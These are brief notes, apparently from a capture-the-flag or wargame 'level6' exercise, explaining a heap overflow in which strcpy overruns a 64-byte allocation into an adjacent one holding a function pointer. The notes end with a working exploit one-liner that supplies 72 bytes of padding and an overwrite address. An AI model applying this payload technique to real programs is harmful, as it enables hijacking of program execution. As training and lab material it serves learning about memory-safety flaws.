they take adress in the seconde malloc and call it 
so two malloc of same size range are usually followed

strcpy can overflow.
if we give it a string enough long, we can write on the second malloc through strcpy.


first malloc size of 64
second malloc size of 4
start copy at -4


./level6 $(python -c 'print "C" * 72 + "\x54\x84\x04\x08"')
